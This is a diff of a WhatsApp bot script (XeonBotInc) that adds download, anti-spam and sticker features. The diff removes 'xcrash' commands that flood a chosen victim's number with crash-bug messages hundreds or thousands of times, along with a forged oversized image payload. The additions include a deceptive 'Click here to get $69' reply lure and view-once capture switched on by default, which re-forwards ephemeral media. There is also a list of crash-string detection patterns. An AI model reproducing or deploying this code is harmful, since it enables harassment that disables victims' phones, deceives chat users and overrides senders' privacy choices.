@@ -6,9 +6,9 @@
 //GitHub: @DGXeon
 //WhatsApp: +919339619072
 //want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
-
 require('./lib/listmenu')
 const {
+	downloadContentFromMessage,
     BufferJSON,
     WA_DEFAULT_EPHEMERAL,
     generateWAMessageFromContent,
@@ -40,11 +40,13 @@ const fg = require('api-dylux')
 const googleTTS = require('google-tts-api')
 const jsobfus = require('javascript-obfuscator')
 const {translate} = require('@vitalets/google-translate-api')
+const { download } = require('aptoide-scraper');
 const scp2 = require('./lib/scraper2') 
+const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
 const pkg = require('imgur')
 const { ImgurClient } = pkg
+const uploadImage = require('./lib/uploadImage')
 const client = new ImgurClient({ clientId: "a0113354926015a" })
-
 const {
     exec,
     spawn,
@@ -97,6 +99,7 @@ const {
     buffergif,
     totalcase
 } = require('./lib/myfunc')
+const { xeon_antispam } = require('./lib/antispam')
 //prem owner function
 const {
     addPremiumUser,
@@ -106,6 +109,16 @@ const {
     checkPremiumUser,
     getAllPremiumUser,
 } = require('./lib/premiun')
+//store
+const { 
+addResponList, 
+delResponList, 
+isAlreadyResponList, 
+isAlreadyResponListGroup, 
+sendResponList, 
+updateResponList, 
+getDataResponList 
+} = require('./lib/list')
 //data
 let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
 let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
@@ -120,13 +133,10 @@ const DocXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/doc.json'))
 const ZipXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/zip.json'))
 const ApkXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/apk.json'))
 
-//bug database
-const { xeontextx } = require('./src/data/function/XBug/xeontextx')
-const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
-const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
-const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
-const { xeontext4 } = require('./src/data/function/XBug/xeontext4')
-const { xeontext5 } = require('./src/data/function/XBug/xeontext5')
+
+
+//store database
+const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))
 
 const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))
 
@@ -139,7 +149,6 @@ others: {},
 users: {},
 chats: {},
 settings: {},
-antipromote: {},
 ...(global.db.data || {})
 }
 
@@ -178,7 +187,7 @@ const reSize = async(buffer, ukur1, ukur2) => {
    })
 }
 //module
-module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
+module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
     try {
         const {
             type,
@@ -191,20 +200,20 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         var budy = (typeof m.text == 'string' ? m.text : '')
         //prefix 1
         var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
-        const isCmd = body.startsWith(prefix, '')
-        const isCmd2 = body.startsWith(prefix)
+        const isCmd = body.startsWith(prefix)
+        //prefix2 and command2 particulary for auto download
+        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
+        const isCmd2 = body.startsWith(prefix2)
         const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
-        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
         const args = body.trim().split(/ +/).slice(1)
         const full_args = body.replace(command, '').slice(1).trim()
         const pushname = m.pushName || "No Name"
         const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
-        const itsMe = m.sender == botNumber ? true : false
         const sender = m.sender
         const text = q = args.join(" ")
         const from = m.key.remoteJid
-        const fatkuns = (m.quoted || m)
-        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
+        const xeonymisc = (m.quoted || m)
+        const quoted = (xeonymisc.mtype == 'buttonsMessage') ? xeonymisc[Object.keys(xeonymisc)[1]] : (xeonymisc.mtype == 'templateMessage') ? xeonymisc.hydratedTemplate[Object.keys(xeonymisc.hydratedTemplate)[1]] : (xeonymisc.mtype == 'product') ? xeonymisc[Object.keys(xeonymisc)[0]] : m.quoted ? m.quoted : m
         const mime = (quoted.msg || quoted).mimetype || ''
         const qmsg = (quoted.msg || quoted)
         //media
@@ -275,36 +284,14 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
-        
+ 
+ 
+
         //premium
         async function replyprem(teks) {
     replygcxeon(`This feature is for premium user, contact the owner to become premium user`)
 }
-        // button reply message 
- 
-        async function sendbuttonsResponseMessage()
-        {
-            // Construct message data
-            target = m.chat,
-            message = 'select options from below'
-           buton = [
-                { type: 'reply', title: 'menu', payload: 'menu' },
-                { type: 'reply', title: 'ping', payload: 'ping' },
-            ]
-            const messageData = {
-                to: target,
-                type: 'text',
-                text: message,
-                buttons: buton
-            };
-        
-            // Replace with your code to send the message using the WhatsApp API
-            return await sendbuttonsResponseMessage(messageData)
-        }
-
-
         //script replier
-       
         async function sendXeonBotIncMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
@@ -347,36 +334,35 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
                      }
                   }
                }, { quoted: m })
+            } else if (typereply === 'v4') {
+                replygcxeon2(teks)
             }
         }
         
-        //fake bug
-        const fbug2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "status@broadcast"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": `${xeontext1}`, "caption": `${xeontext1}`, 'jpegThumbnail': thumb}}}
-        let fbug = { 
-            key: { 
-               fromMe: false, 
-               participant: `0@s.whatsapp.net`,  
-               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
-            },
-               message: {  
-                  "imageMessage": { 
-                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
-                     "mimetype": "image/jpeg", 
-                     "caption": `${xeontext3}`,
-                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
-                     "fileLength": "999999999",
-                     "height": 999999999,
-                     "width": 999999999,
-                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
-                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
-                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
-                     "mediaKeyTimestamp": "1610993486",
-                     "jpegThumbnail": await reSize(thumb, 100, 100),
-                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
-                  }
-               }
-            }
-            //end fbug
+        //fake reply with channel link embedded
+async function replygcxeon2(txt) {
+const xeonnewrep = {      
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+forwardedNewsletterMessageInfo: {
+newsletterName: "Click here to get $69",
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {  
+showAdAttribution: true,
+title: botname,
+body: ownername,
+thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+sourceUrl: websitex
+},
+},
+text: txt,
+}
+return XeonBotInc.sendMessage(from, xeonnewrep, {
+quoted: m,
+})
+}
             
         let fstatus = { 
             key: { 
@@ -479,7 +465,8 @@ return arr[Math.floor(Math.random() * arr.length)]
                   if (!('badword' in chats)) chats.badword = false
                   if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                   if (!('antibot' in chats)) chats.antibot = false
-                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
+                  if (!('antiviewonce' in chats)) chats.antiviewonce = true
+                  if (!('antispam' in chats)) chats.antispam = false
                   if (!('antimedia' in chats)) chats.media = false
                   if (!('antivirtex' in chats)) chats.antivirtex = false
                   if (!('antiimage' in chats)) chats.antiimage = false
@@ -493,11 +480,14 @@ return arr[Math.floor(Math.random() * arr.length)]
                   if (!('antilink' in chats)) chats.antilink = false
                   if (!('antilinkgc' in chats)) chats.antilinkgc = false
                   if (!('antipromote' in chats)) chats.antipromote = false
+                  if (!('antipromotion' in chats)) chats.antipromotion = false
                } else global.db.data.chats[from] = {
                   badword: false,
                   antiforeignnum: false,
                   antibot: false,
-                  antiviewonce: false,
+                  antipromote: false,
+                  antiviewonce: true,
+                  antispam: false,
                   antivirtex: false,
                   antimedia: false,
                   antiimage: false,
@@ -509,7 +499,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                   antidocument: false,
                   anticontact: false,
                   antilink: false,
-                  antipromote: false,
+                  antipromotion: false,
                   antilinkgc: false
                }
             
@@ -520,6 +510,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                if (!('totalError' in setting)) setting.totalError = 0
                if (!('online' in setting)) setting.online = false 
                if (!('autosticker' in setting)) setting.autosticker = false 
+               if (!('autodownload' in setting)) setting.autodownload = false 
                if (!('autobio' in setting)) setting.autobio = false 
                if (!('autoread' in setting)) setting.autoread = false
                if (!('autorecordtype' in setting)) setting.autorecordtype = false
@@ -537,6 +528,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                totalError: 0,
                online: false,
                autosticker: false,
+               autodownload: false,
                autobio: false,
                autoread: false,
                autoblocknum: false,
@@ -566,7 +558,7 @@ return arr[Math.floor(Math.random() * arr.length)]
         } catch (err) {
             console.log(err)
         }
-        
+       
         //photo uploader
         async function uploadtoimgur(imagepath) {
   try {
@@ -582,8 +574,7 @@ return arr[Math.floor(Math.random() * arr.length)]
     console.error('Error uploading image to Imgur:', error)
     throw error
   }
-}
-        
+}        
         async function ephoto(url, texk) {
 let form = new FormData 
 let gT = await axios.get(url, {
@@ -625,21 +616,22 @@ let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", 
 return build_server + data.image
 }
 
-//bug loading
-async function loading () {
-var xeonlod = [
-"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
-"《 ████▒▒▒▒▒▒▒▒》30%",
-"《 ███████▒▒▒▒▒》50%",
-"《 ██████████▒▒》80%",
-"《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
-]
-let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
-
-for (let i = 0; i < xeonlod.length; i++) {
-await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key })
+//autoreact
+const xeonreact = async () => {
+  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
+  for (const emoji of emojis) {
+    await sleep(80);
+    XeonBotInc.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
+  }
+  await sleep(50);
+  XeonBotInc.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
 }
+
+
+const xeonimun = (texto) => {
+XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
+return reply("Erro..")
+})
 }
 
 async function obfus(query) {
@@ -668,6 +660,40 @@ async function obfus(query) {
     }
     })
 }
+
+//sticker meta function
+async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
+  const {
+      default: {
+            Image
+                }
+                  } = await import('node-webpmux')
+                    const img = new Image()
+                      const json = {
+                          'sticker-pack-id': 'Natsxe',
+                              'sticker-pack-name': packname,
+                                  'sticker-pack-publisher': author,
+                                      'emojis': categories,
+                                          'is-avatar-sticker': 1,
+                                              ...extra
+                                                }
+                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
+                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
+                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
+                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
+                                                          await img.load(buffer)
+                                                            img.exif = exif
+                                                              return await img.save(null)
+                                                              }
+function makeid(length) {
+  let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      const charactersLength = characters.length;
+  for (let i = 0; i < length; i++) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+  return result;
+  }
 
 async function styletext(teks) {
     return new Promise((resolve, reject) => {
@@ -701,6 +727,25 @@ async function styletext(teks) {
         }
     resolve(xeonyresult)
     })
+}
+
+//mega download
+function formatBytes(bytes) {
+    if (bytes === 0) return '0 Bytes';
+
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+//trace anime
+function formatDuration(ms) {
+  let seconds = Math.floor((ms / 1000) % 60);
+  let minutes = Math.floor((ms / (1000 * 60)) % 60);
+  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
+  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
 }
         
         //limit func
@@ -796,7 +841,7 @@ list.push({
             console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
             global.db.data.settings[botNumber].totalhit += 1
         }
-    
+
         //antiviewonce
     if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
         let val = { ...m }
@@ -805,6 +850,34 @@ list.push({
         val.message = msg
         await XeonBotInc.sendMessage(m.chat, { forward: val }, { quoted: m })
     }
+    
+    //antispam kick
+if (db.data.chats[m.chat].antispam) {
+if (m.isGroup && m.message && xeon_antispam.isFiltered(from)) {
+console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
+return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+}
+}
+    
+    // Anti promotion
+if (db.data.chats[m.chat].antipromotion) {
+if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
+if (!isBotAdmins) return
+if(XeonTheCreator) return
+if (isAdmins) return
+XeonBotInc.sendMessage(m.chat,
+			    {
+			        delete: {
+			            remoteJid: m.chat,
+			            fromMe: false,
+			            id: m.key.id,
+			            participant: m.key.participant
+			        }
+			    })
+XeonBotInc.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+}
+}
+
         //ANTI VIRUS
 if (isGroup && db.data.chats[m.chat].antivirtex) {
 if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
@@ -821,7 +894,7 @@ XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
  
  if (db.data.chats[m.chat].antibot) {
     if (m.isBaileys && m.fromMe == false){
-        if (isAdmin || !isBotAdmin){		  
+        if (isAdmins || !isBotAdmins){		  
         } else {
           replygcxeon(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
     return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
@@ -927,6 +1000,35 @@ XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
                }
             }
         }
+        //auto download #ctto
+        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
+try {
+if (budy.match(`instagram.com`)) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
+let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+} else if (budy.match(`tiktok.com`)) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
+let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+} else if (budy.match(`facebook.com`)) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
+let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+} else if (budy.match(`youtube.com|youtu.be`)) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
+let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+} 
+} catch (err) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
+}
+} 
+        
         //autosticker
         if (db.data.settings[botNumber].autosticker) {
         	if (m.key.fromMe) return
@@ -996,10 +1098,34 @@ if (XeonTheCreator) return replygcxeon(bvl)
         
 //total features
 const xeonfeature = () =>{
-            var mytext = fs.readFileSync("./XeonCheems11.js").toString()
+            var mytext = fs.readFileSync("./XeonCheems12.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length
             return numUpper
         }
+        
+        //download status #ctto
+        try {
+  const textLower = m.text.toLowerCase();
+  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
+    const quotedMessage = m.msg.contextInfo.quotedMessage;
+    if (quotedMessage) {
+      if (quotedMessage.imageMessage) {
+        let imageCaption = quotedMessage.imageMessage.caption;
+        let imageUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
+        XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
+        replygcxeon('*Downloading status...*');
+      }
+      if (quotedMessage.videoMessage) {
+        let videoCaption = quotedMessage.videoMessage.caption;
+        let videoUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
+        XeonBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
+        replygcxeon('*Downloading status...*');
+      }
+    }
+  }
+} catch (error) {
+  console.error("Error in 'send message' handling:", error);
+}
         //autoreply
 for (let BhosdikaXeon of VoiceNoteXeon) {
 if (budy === BhosdikaXeon) {
@@ -1056,6 +1182,20 @@ senddocu(buffer)
 }
 }
 
+// Response Addlist
+if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
+var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
+if (get_data_respon.isImage === false) {
+XeonBotInc.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
+quoted: m
+})
+} else {
+XeonBotInc.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
+quoted: m
+})
+} 
+}
+
 // Respon Cmd with media
 if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
 let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
@@ -1077,7 +1217,7 @@ XeonBotInc.ev.emit('messages.upsert', msg)
 }
 
 //math
-if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
+if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 	if (m.key.fromMe) return
             kuis = true
             jawaban = kuismath[m.sender.split('@')[0]]
@@ -1236,6 +1376,7 @@ fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, n
 }
         
         switch (isCommand) {
+
             case 'addbadword': case 'addbd':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!groupAdmins) return replygcxeon(mess.admin)
@@ -1269,27 +1410,28 @@ fs.writeFileSync('./src/data/role/user.json', JSON.stringify(xeonverifieduser, n
             break
             case 'setmenu':{
                if (!XeonTheCreator) return XeonStickOwner()
-               if (!text) return replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
+               if (!text) return replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9,v10)\nPlease select one\nExample ${prefix + command} v1`)
                if (text.startsWith('v')) {
                   typemenu = text
                   replygcxeon(mess.done)
                } else {
-                  replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
+                  replygcxeon(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8,v9,v10)\nPlease select one\nExample ${prefix + command} v1`)
                }
             }
             break
             case 'setreply':{
                if (!XeonTheCreator) return XeonStickOwner()
-               if (!text) return replygcxeon(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
+               if (!text) return replygcxeon(`There are 3 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
                if (text.startsWith('v')) {
                   typereply = text
                   replygcxeon(mess.done)
                } else {
-                  replygcxeon(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
+                  replygcxeon(`There are 3 reply(v1,v2,v3,v4)\nPlease select 1\nExample ${prefix+command} v1`)
                }
             }
             break
             case 'statustext': 
+            case 'upswtext':
             case 'upswteks': {
                if (!XeonTheCreator) return XeonStickOwner()
                if (!q) return replygcxeon('Text?')
@@ -1477,42 +1619,6 @@ owner.splice(unp, 1)
 fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
 replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
 break
-case 'xcrash':{
-if (!isPremium) return replygcxeon(mess.prem)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
- victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-XeonyCrashy(pushname,victim)
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'xcrash1k':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "1000"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3000)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break
-case 'xcrash5k':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "5000"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3500)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break
 case 'listowner': {
                 let teks = '┌──⭓「 *List Owner* 」\n│\n'
                 for (let x of owner) {
@@ -1687,16 +1793,25 @@ case 'listowner': {
                 }
             break
             case 'autosticker': case 'autostickergc':
-                if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (!XeonTheCreator) return XeonStickOwner()
                 if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                 if (q == 'on') {
                     db.data.settings[botNumber].autosticker = true
